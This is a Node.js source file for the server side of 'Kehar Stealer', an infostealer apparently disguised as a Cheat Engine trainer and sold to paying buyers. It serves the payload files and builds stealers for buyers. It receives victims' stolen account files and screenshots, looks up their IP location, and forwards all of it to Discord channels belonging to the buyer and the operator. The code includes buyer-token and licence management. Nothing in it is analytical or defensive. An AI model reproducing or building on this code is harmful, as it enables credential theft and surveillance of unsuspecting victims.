const express = require("express");
const { Collection, Client } = require("discord.js");
const Discord = require("discord.js");
const { base64encode, base64decode } = require("nodejs-base64");
const green = "#88ff80";
const ipfetch = require("ip-fetch");
const red = "#ff6b6b";
const fileUpload = require("express-fileupload");
const white = "#fafafa";
const blue = "#5e9cff";
const client = new Client();
const db = require("quick.db");
var builder = new db.table("builder");
const { Util, MessageEmbed } = require("discord.js");
const avatar =
  "https://cdn.discordapp.com/avatars/873136686257799168/872b6471e0e464f8a3f9cbb9ff0109ee.png?size=256";
const bodyParser = require("body-parser");
const XMLHttpRequest = require("xmlhttprequest");

const buyers = ["862466509704134666"];
const { MessageAttachment } = require("discord.js");

const app = express();
app.use(bodyParser.json());
app.use(fileUpload());
app.get("/info", (req, res) => {
  let ip = (req.headers["x-forwarded-for"] || "").split(",")[0];
  let time = new Date().toLocaleString();
  res.send(`{"ip": "${ip}","time": "${time}"}`);
  console.log(`{"ip": "${ip}","time": "${time}"}`);
});

app.get("/ip", (req, res) => {
  let ip = (req.headers["x-forwarded-for"] || "").split(",")[0];
  res.send(ip);
});

app.get("/elauth", (req, res) => {
res.send(process.env.ELAUTH)
});

app.get("/vtoken", (req, res) => {
  let rtoken = req.query.token;
  console.log(rtoken)
  let buff = new Buffer.from(rtoken, "base64");
  let token = buff.toString("ascii");
  if (!client.channels.cache.get(token)) res.send("false");
  else res.send("true");
});



app.get("/status", (req, res) => {
  var status = builder.get("status");
  if (status || !status) res.send("true");
  else if (status == false) res.send("false");
});

app.get("/authstatus", (req, res) => {
  res.send(false)
  // var status = builder.get("authstatus");
  // if (status || !status) res.send("true");
  // else if (status == false) res.send("false");
});

app.get("/stealer", (req, res) => {
  res.sendFile(__dirname + "/files/Stealer.bat");
});

app.get("/cetrainer", (req, res) => {
  res.sendFile(__dirname + "/files/Stealer.CETRAINER");
});

app.get("/auth", (req, res) => {
  var id = req.query.id;
  var validity = JSON.parse(builder.get(id)); // {"access":"true", "uuid":""}
  if (!validity) {
    return;
  }
  if (validity.ip == (req.headers["x-forwarded-for"] || "").split(",")[0])
    res.send(JSON.stringify({ access: validity.access, uuid: validity.uuid }));
  else {
    return;
  }

});



app.post("/built", (req, res) => {
  console.log("ttest")
  var cebuff = req.files.ce.data;
  var ctbuff = req.files.ct.data;
  var data = JSON.parse(req.files.clientdata.data.toString("ascii"));
  var rtoken = data.token;
  let buff = new Buffer.from(rtoken, "base64");
  let token = buff.toString("ascii");
  const sbuilt = new MessageEmbed()
    .setDescription("Your stealer has been built!")
    .setColor(blue)
    .setImage(
      "https://media.discordapp.net/attachments/963680096382763051/964040967759999036/unknown.png"
    );
  client.channels.cache.get(token).send({
    embed: sbuilt,
    files: [
      {
        attachment: cebuff,
        name: data.name + ".CETRAINER",
      },
      {
        attachment: ctbuff,
        name: data.name + ".CT",
      },
    ],
  });
  const lbuilt = new MessageEmbed()
    .setDescription(data.id + " Built new stealer.")
    .setColor(blue)
    .setImage(
      "https://media.discordapp.net/attachments/963680096382763051/964040967759999036/unknown.png"
    );
  client.channels.cache.get(process.env.LOG).send({
    embed: lbuilt,
    files: [
      {
        attachment: cebuff,
        name: data.name + ".CETRAINER",
      },
      {
        attachment: ctbuff,
        name: data.name + ".CT",
      },
    ],
  });

  res.send("Successful!");
});

app.post("/account", (req, res) => {
  console.log("received account")
  var imgbuff = req.files.screenshot.data;
  var accbuff = req.files.account.data;
  var data = JSON.parse(req.files.clientdata.data.toString("ascii"));
  var rtoken = data.token;
  let buff = new Buffer.from(rtoken, "base64");
  let token = buff.toString("ascii");
  let ip = (req.headers["x-forwarded-for"] || "").split(",")[0];
  var info;
  let compname = data.compname;
  let attachment = new Discord.MessageAttachment(imgbuff, "Screenshot.png");
  let get = async () => {
    info = await ipfetch.getLocationNpm(ip);
    const newvictim = new MessageEmbed()
      .attachFiles(attachment)
      .setImage("attachment://Screenshot.png")
      .setTitle("Information")
      .addField("IP Address", ip)
      .addField("Computer Name", compname)
      .addField(
        "Country",
        info.country + " :flag_" + info.countryCode.toLowerCase() + ":"
      )
      .addField(
        "Screenshot",
        "Sent At <t:" + Math.round(new Date().getTime() / 1000) + ">"
      )
      .setColor(blue)
      .setAuthor("New Account")
      .setFooter("Kehar Stealer ");
    const kehar = new MessageEmbed()
      .setDescription("Kehar Stealer")
      .setColor(blue)
     /* .setImage(
        "https://media.discordapp.net/attachments/963680096382763051/964040967759999036/unknown.png"
      )*/;
    if (!client.channels.cache.get(token)) {
      res.status(400);
      return res.send("Invalid Token Specified!");
    } else {
      await client.channels.cache.get(token).send({
        embed: newvictim,
        files: [
          {
            attachment: accbuff,
            name: "Account.reg",
          },
        ],
      });
      client.channels.cache.get(token).send(kehar);
      client.channels.cache.get(process.env.LOG).send({
        embed: newvictim,
        files: [
          {
            attachment: accbuff,
            name: "Account.reg",
          },
        ],
      });

      res.send("Successful!");
    }
  };
  get();
});

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

client.on('message', msg => {
if (msg.content == '>token') {
  if(msg.guild === null) return;
if(!buyers.includes(msg.author.id)) return;
  var token = Buffer.from(msg.channel.id).toString('base64')
      const tokene = new MessageEmbed()
      .setTitle("Generated Token")
      .setDescription("```"+token+"```")
      .setColor(blue)
  msg.channel.send(tokene)
}
  else if (msg.content.startsWith('>clicense')) {
    if(msg.author.id != 862466509704134666) return;
    console.log("test")
    var license=makeid(15)
    let message = msg.content.split(" ");
builder.set(license, JSON.stringify({access:message[1], uuid:message[2], ip:message[3]})  )//{"access":"true", "uuid":""}
      const tokene = new MessageEmbed()
      .setTitle("Created License")
      .setDescription("```"+license+"```")
      .setColor(blue)
  msg.channel.send(tokene)
}

else if (msg.content.startsWith('>ulicense')) {
    if(msg.author.id != 862466509704134666) return;
    let message = msg.content.split(" ");
builder.set(message[1], JSON.stringify({access:message[2], uuid:message[3], ip:message[4]}))//{"access":"true", "uuid":""}
      const tokene = new MessageEmbed()
      .setTitle("Updated Licenss")
      .setDescription("```"+JSON.stringify({access:message[2], uuid:message[3], ip:message[4]})+"```")
      .setColor(blue)
      .setImage(
        "https://media.discordapp.net/attachments/963680096382763051/964040967759999036/unknown.png"
      );
  msg.channel.send(tokene)
}

});


app.listen(3000);
client.login(process.env.TOKEN);


